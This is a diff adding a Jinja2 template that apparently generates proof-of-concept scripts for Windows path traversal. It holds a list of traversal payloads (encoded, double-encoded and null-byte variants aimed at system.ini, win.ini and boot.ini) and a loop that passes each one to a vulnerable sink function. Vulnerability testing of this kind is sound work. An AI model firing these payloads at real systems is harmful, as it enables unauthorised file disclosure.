@@ -1,0 +1,37 @@
+{% extends "poc/base.py.j2" %}
+
+{% block description %}Path traversal vulnerability{% endblock %}
+
+{% block payload %}
+# Path traversal payloads for Windows
+TRAVERSAL_PAYLOADS = [
+    b"..\\..\\..\\..\\windows\\system.ini",
+    b"..\\..\\..\\..\\windows\\win.ini",
+    b"..\\..\\..\\..\\boot.ini",
+    b"..%5c..%5c..%5c..%5cwindows%5csystem.ini",
+    b"..%255c..%255c..%255c..%255cwindows%255csystem.ini",
+    b"../../../../windows/system.ini",
+    b"....//....//....//....//windows/system.ini",
+    b"..%2f..%2f..%2f..%2fwindows/system.ini",
+    b"..\\..\\..\\..\\windows\\system.ini%00.txt",
+]
+{% endblock %}
+
+{% block exploit_doc %}Execute path traversal exploit{% endblock %}
+
+{% block exploit_body %}
+        print(f"[*] Sink API: {{ sink_api }}")
+
+        for i, payload in enumerate(TRAVERSAL_PAYLOADS):
+            print(f"\n[{i+1}/{len(TRAVERSAL_PAYLOADS)}] Trying: {payload[:50]}...")
+            try:
+                args = arg_builder.build(payload, payload_arg_idx={{ tainted_arg | default(0) }})
+                result = func(*args)
+                print(f"    -> Returned: {result}")
+            except OSError as e:
+                print(f"    -> Windows Error: {e}")
+            except Exception as e:
+                print(f"    -> Exception: {type(e).__name__}: {e}")
+
+        print("\n[+] All payloads tested")
+{% endblock %}
